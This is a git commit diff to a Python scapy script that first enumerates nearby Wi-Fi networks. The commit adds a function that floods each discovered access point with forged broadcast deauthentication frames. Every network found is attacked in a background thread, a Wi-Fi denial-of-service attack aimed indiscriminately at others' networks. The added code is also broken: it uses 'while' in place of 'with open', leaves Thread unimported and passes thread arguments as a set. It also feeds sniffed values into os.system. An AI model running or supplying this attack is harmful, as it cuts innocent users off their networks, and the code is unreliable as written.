9b8c520dcb4d2d6e48f677fc2c3a3bc3a48fa60f
FoXhack1 <fox.pclyc@gmail.com>
2024-10-19 02:30:34 +0200

    Update wifi (1).py

--- wifi (1).py
+++ wifi (1).py
@@ -1,3 +1,5 @@
+import os
+
 from scapy.all import *
 import json
 
@@ -26,6 +28,28 @@ def WifiEnumeration(packet):
             data = {"ssid": ssid, "bssid": bssid, "channel": channel, "crypto": crypto}
             networks.append(data)
 
+def deauth_attack(ap_mac, channel):
+    os.system(f"iwconfig wlan1 channel {channel}")
+    packet = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
+
+    for i in range(1000):
+        send(packet, iface="wlan1", verbose=0)
+
+
 if __name__ == "__main__":
     sniff(prn=WifiEnumeration, iface="wlan1", timeout=5)
     write_networks()
+
+    saved_networks = []
+    while ("wifi_networks.json", "r") as f:
+        saved_networks = json.loads(f.read())
+
+
+    for net in saved_networks:
+        ap_mac = net['bssid']
+        channel = net['channel']
+        ssid = net['ssid']
+        print(f"Trying to deauthenticate {ssid}..")
+        deauther = Thread(target=deauth_attack, args={ap_mac, channel})
+        deauther.daemon = True
+        deauther.start()
